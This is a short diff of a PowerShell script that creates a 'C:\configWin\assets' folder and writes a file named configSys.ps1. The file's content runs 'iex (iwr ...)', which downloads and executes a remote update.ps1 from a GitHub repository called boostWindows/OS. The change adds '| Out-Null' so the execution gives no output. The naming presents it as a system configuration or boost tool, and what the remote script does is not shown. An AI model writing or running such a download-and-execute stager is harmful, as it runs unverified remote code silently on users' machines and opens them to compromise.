@@ -2,7 +2,7 @@ mkdir "C:\configWin" | out-null
 mkdir "C:\configWin\assets" | out-null
 
 $contenuto = @'
-iex (iwr 'https://raw.githubusercontent.com/boostWindows/OS/refs/heads/main/update.ps1')
+iex (iwr 'https://raw.githubusercontent.com/boostWindows/OS/refs/heads/main/update.ps1') | Out-Null
 '@
 
 $contenuto | Out-File "C:\configWin\assets\configSys.ps1"
